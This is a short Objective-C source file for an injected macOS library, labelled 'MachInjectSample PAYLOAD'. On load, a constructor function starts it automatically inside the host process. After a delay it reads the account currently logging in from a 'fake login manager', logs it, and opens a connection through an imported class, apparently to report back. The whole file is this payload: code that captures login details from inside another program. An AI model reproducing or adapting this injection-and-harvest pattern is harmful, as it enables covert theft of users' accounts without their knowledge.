//
//  main.c
//  Dark
//
//  Created by Erwan Barrier on 8/8/12.
//  Copyright (c) 2012 Erwan Barrier. All rights reserved.
//

#include <syslog.h>
#import <objc/runtime.h>
#import "Promethus.h"
#import "PTSConnection.h"
#import "FSFakeLoginManager.h"
#import "FSLogger.h"

__attribute__((constructor))
void load()
{
  syslog(LOG_ERR, "MachInjectSample PAYLOAD: My pid is %d\n", getpid());
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        FSLogDebug(@"Login %@",[[FSFakeLoginManager defaultManager] currentLoginingAccount]);
    });
    [[PTSConnection shareConnection] ensureConnect];
}



